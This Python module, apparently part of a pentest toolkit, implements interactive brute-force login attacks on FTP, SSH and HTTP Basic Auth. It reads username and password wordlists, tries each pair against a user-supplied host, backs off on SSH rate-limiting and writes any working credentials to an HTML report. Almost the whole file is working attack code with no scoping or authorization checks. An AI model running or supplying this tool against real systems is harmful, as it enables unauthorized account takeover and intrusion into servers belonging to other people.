import ftplib
import os
import paramiko
import requests # Added for HTTP requests
from requests.auth import HTTPBasicAuth # Added for Basic Auth
from datetime import datetime
import time
import random
from utils.reporter import write_html_section


def clear():
    os.system("cls" if os.name == "nt" else "clear")

def run_ftp_bruteforce():
    clear()
    print("\n🔐 [FTP Brute-Force]")

    while True:
        target = input("Enter FTP IP or domain: ").strip()
        if not target:
            print("[❌] Target cannot be empty.")
        else:
            break  # Add more sophisticated validation if needed (e.g., regex for IP/domain)

    while True:
        port_str = input("Enter port (default 21): ").strip()
        if not port_str:
            port = 21
            break
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                break
            else:
                print("[❌] Port must be between 1 and 65535.")
        except ValueError:
            print("[❌] Invalid port number.")

    while True:
        userlist_path = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
        if not userlist_path:
            print("[❌] Username wordlist path cannot be empty.")
        elif not os.path.exists(userlist_path):
            print(f"[❌] Username wordlist file not found: {userlist_path}")
        else:
            break

    while True:
        passlist_path = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()
        if not passlist_path:
            print("[❌] Password wordlist path cannot be empty.")
        elif not os.path.exists(passlist_path):
            print(f"[❌] Password wordlist file not found: {passlist_path}")
        else:
            break

    # The os.path.exists checks are handled in the input loops above.

    try:
        with open(userlist_path, 'r', encoding='utf-8', errors='ignore') as ufile:
         usernames = [u.strip() for u in ufile if u.strip()]
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as pfile:
         passwords = [p.strip() for p in pfile if p.strip()]
    except Exception as e:
        print(f"[❌] Error reading files: {e}")
        input("Press Enter to return...")
        return


    print(f"\n[🔍] Starting brute-force on {target}:{port}...\n")
    start_time = time.time()
    found_credentials = None

    try:
        for username in usernames:
            for password in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=3)
                    ftp.login(username, password)
                    print(f"[✅] SUCCESS: {username}:{password}")
                    ftp.quit()
                    found_credentials = f"{username}:{password}"
                    # Break out of both loops if credentials are found
                    raise StopIteration
                except ftplib.error_perm:
                    print(f"[❌] Failed: {username}:{password}")
                except Exception as e:
                    print(f"[⚠️ ] Error: {e}")
                    # Decide if you want to break the inner loop or continue
                    # For now, let's break the inner loop on other errors
                    break
            if found_credentials: # If found in inner loop, break outer
                break
    except StopIteration: # Custom signal to break from nested loops
        pass
    finally:
        end_time = time.time()
        duration = round(end_time - start_time, 2)

        report_lines = [
            f"Target: {target}:{port}",
            f"Service: FTP",
            f"Scan Duration: {duration} seconds",
            f"Username Wordlist: {userlist_path}",
            f"Password Wordlist: {passlist_path}",
        ]
        if found_credentials:
            report_lines.append(f"Outcome: Credentials Found")
            report_lines.append(f"Credentials: {found_credentials}")
            status_message = "[✅] Credentials found and reported."
        else:
            report_lines.append(f"Outcome: No Credentials Found")
            status_message = "[❌] No valid credentials found. Report generated."

        write_html_section("FTP Brute-Force Results", report_lines)
        print(f"\n[💾] {status_message} Appended to report.html")
        input("Press Enter to return...")

import os, time, random, paramiko
from tqdm import tqdm  # install with: pip install tqdm

def run_ssh_bruteforce():
    clear()
    print("\n🔐 [SSH Brute-Force] (Single Username Mode)")

    while True:
        target = input("Enter SSH IP or domain: ").strip()
        if not target:
            print("[❌] Target cannot be empty.")
        else:
            break # Add more sophisticated validation if needed

    while True:
        port_str = input("Enter port (default 22): ").strip()
        if not port_str:
            port = 22
            break
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                break
            else:
                print("[❌] Port must be between 1 and 65535.")
        except ValueError:
            print("[❌] Invalid port number.")

    while True:
        username = input("Enter known username: ").strip()
        if not username:
            print("[❌] Username cannot be empty.")
        else:
            break

    while True:
        passlist_path = input("Path to password wordlist: ").strip()
        if not passlist_path:
            print("[❌] Password wordlist path cannot be empty.")
        elif not os.path.exists(passlist_path):
            print(f"[❌] Password wordlist file not found: {passlist_path}")
        else:
            break

    # The os.path.exists check is handled in the input loop above.

    try:
        with open(passlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[❌] Error reading wordlist: {e}")
        input("Press Enter to return...")
        return

    print(f"\n[🔍] Brute-forcing {target}:{port} with user '{username}' ({len(passwords):,} passwords)\n")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    start_time = time.time()
    found_password = None

    try:
        for password in tqdm(passwords, desc="Trying passwords", unit="pw"):
            try:
                client.connect(
                    hostname=target,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5,
                    auth_timeout=5,
                    banner_timeout=5,
                    allow_agent=False,
                    look_for_keys=False
                )
                tqdm.write(f"\n[✅] SUCCESS! Credentials: {username}:{password}")
                found_password = password
                client.close()
                break  # Exit loop once password is found
            except paramiko.AuthenticationException:
                pass  # invalid login, ignore
            except paramiko.SSHException as e:
                tqdm.write(f"[⚠️ ] SSH error or rate-limiting detected: {e}")
                time.sleep(random.uniform(5, 10)) # Wait a bit if SSH server is unhappy
            except Exception as e:
                tqdm.write(f"[❌] Unexpected error: {e}")
            finally:
                # Ensure client is closed if it was opened and an error occurred mid-connection attempt
                # However, client.connect() might not always initialize the transport if it fails early.
                if client._transport and client._transport.is_active():
                    client.close()
    finally:
        end_time = time.time()
        duration = round(end_time - start_time, 2)

        report_lines = [
            f"Target: {target}:{port}",
            f"Service: SSH",
            f"Username: {username}",
            f"Password Wordlist: {passlist_path}",
            f"Scan Duration: {duration} seconds",
        ]

        if found_password:
            report_lines.append(f"Outcome: Password Found")
            report_lines.append(f"Credentials: {username}:{found_password}")
            status_message = "[✅] Credentials found and reported."
        else:
            report_lines.append(f"Outcome: No Password Found")
            status_message = "[❌] No valid password found. Report generated."
            # This print was originally after the loop, moving it here to be part of the final status
            print("\n[❌] No valid password found.")

        write_html_section("SSH Brute-Force Results", report_lines)
        print(f"[💾] {status_message} Appended to report.html")
        input("Press Enter to return...")


def run_http_bruteforce():
    clear()
    print("\n🔐 [HTTP Basic Auth Brute-Force]")

    while True:
        target_url = input("Enter Target URL (e.g., http://example.com/protected): ").strip()
        if not target_url:
            print("[❌] Target URL cannot be empty.")
        # Basic check for http/https prefix, can be more sophisticated
        elif not (target_url.startswith("http://") or target_url.startswith("https://")):
            print("[❌] Invalid URL format. Please include http:// or https://")
        else:
            break

    while True:
        userlist_path = input("Path to username wordlist (e.g. wordlists/users.txt): ").strip()
        if not userlist_path:
            print("[❌] Username wordlist path cannot be empty.")
        elif not os.path.exists(userlist_path):
            print(f"[❌] Username wordlist file not found: {userlist_path}")
        else:
            break

    while True:
        passlist_path = input("Path to password wordlist (e.g. wordlists/passwords.txt): ").strip()
        if not passlist_path:
            print("[❌] Password wordlist path cannot be empty.")
        elif not os.path.exists(passlist_path):
            print(f"[❌] Password wordlist file not found: {passlist_path}")
        else:
            break

    # The os.path.exists checks are handled in the input loops above.

    try:
        with open(userlist_path, 'r', encoding='utf-8', errors='ignore') as ufile:
            usernames = [u.strip() for u in ufile if u.strip()]
        with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as pfile:
            passwords = [p.strip() for p in pfile if p.strip()]
    except Exception as e:
        print(f"[❌] Error reading files: {e}")
        input("Press Enter to return...")
        return

    if not usernames or not passwords:
        print("[❌] Wordlists cannot be empty.")
        input("Press Enter to return...")
        return

    print(f"\n[🔍] Starting HTTP Basic Auth brute-force on {target_url}...\n")
    start_time = time.time()
    found_credentials = None
    connection_error_occurred = False

    try:
        for username in tqdm(usernames, desc="Usernames", unit="user"):
            for password in tqdm(passwords, desc="Passwords", unit="pass", leave=False):
                try:
                    response = requests.get(target_url, auth=HTTPBasicAuth(username, password), timeout=5)

                    if response.status_code == 200:
                        tqdm.write(f"\n[✅] SUCCESS: {username}:{password} (Status: {response.status_code})")
                        found_credentials = f"{username}:{password}"
                        raise StopIteration # Signal to break from loops
                    elif response.status_code == 401:
                        tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Unauthorized)")
                    elif response.status_code == 403:
                        tqdm.write(f"[❌] Failed: {username}:{password} (Status: {response.status_code} Forbidden)")
                    else:
                        tqdm.write(f"[⚠️ ] Info: {username}:{password} (Status: {response.status_code})")

                except requests.exceptions.ConnectionError:
                    tqdm.write(f"[❌] Error: Could not connect to {target_url}. Check URL and connection.")
                    connection_error_occurred = True
                    raise StopIteration # Signal to break from loops and go to finally
                except requests.exceptions.Timeout:
                    tqdm.write(f"[⚠️ ] Timeout for {username}:{password}. Server might be slow or rate-limiting.")
                except requests.exceptions.RequestException as e:
                    tqdm.write(f"[❌] Request error for {username}:{password}: {e}")

                if found_credentials or connection_error_occurred:
                    break # Break inner password loop

                time.sleep(0.1) # Small delay

            if found_credentials or connection_error_occurred:
                break # Break outer username loop

    except StopIteration: # Handles breaking from nested loops
        pass
    finally:
        end_time = time.time()
        duration = round(end_time - start_time, 2)

        report_lines = [
            f"Target URL: {target_url}",
            f"Service: HTTP Basic Auth",
            f"Scan Duration: {duration} seconds",
            f"Username Wordlist: {userlist_path}",
            f"Password Wordlist: {passlist_path}",
        ]

        if connection_error_occurred:
            report_lines.append("Outcome: Connection Error")
            report_lines.append("Details: Could not connect to the target URL. Scan aborted.")
            status_message = "[❌] Connection error. Report generated."
        elif found_credentials:
            report_lines.append("Outcome: Credentials Found")
            report_lines.append(f"Credentials: {found_credentials}")
            status_message = "[✅] Credentials found and reported."
        else:
            report_lines.append("Outcome: No Credentials Found")
            status_message = "[❌] No valid credentials found. Report generated."
            print("\n[❌] No valid credentials found.")


        write_html_section("HTTP Basic Auth Brute-Force Results", report_lines)
        print(f"\n[💾] {status_message} Appended to report.html")
        input("Press Enter to return...")


def run():
    print("🔐 Brute-Force Toolkit") 
    print("[1] FTP Brute-Force")
    print("[2] SSH Brute-Force")
    print("[3] HTTP Basic Auth Brute-Force")
    print("[4] Back")
    choice = input("Select an option: ").strip()

    if choice == '1':
        run_ftp_bruteforce()
    elif choice == '2':
        run_ssh_bruteforce()
    elif choice == '3':
        run_http_bruteforce()
    elif choice == '4':
        return